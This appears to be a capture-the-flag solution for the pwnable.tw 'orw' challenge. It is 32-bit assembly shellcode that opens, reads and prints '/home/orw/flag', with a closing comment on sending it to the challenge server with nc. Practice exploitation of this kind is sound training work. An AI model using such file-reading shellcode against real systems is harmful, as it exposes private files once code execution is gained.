BITS 32

start:
	sub esp,200
	mov dword [esp], 0x6d6f682f
	mov dword [esp+4], 0x726f2f65
	mov dword [esp+8], 0x6c662f77
	mov dword [esp+12], 0x00006761
	;open(esp,0,0)
	mov eax, 5
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80
	;eax=read(eax,esp,200)
	mov ebx, eax
	mov eax, 3
	mov ecx, esp
	mov edx, 200
	int 0x80
	;write(1,esp,eax)
	mov ebx, 1
	mov ecx, esp
	mov edx, eax
	mov eax, 4
	int 0x80
	;restore stack
	add esp, 200
	ret
;After this use nasm like nasm -f bin orw.asm and then nc chall.pwnable.tw 10001 < orw and you get the flag
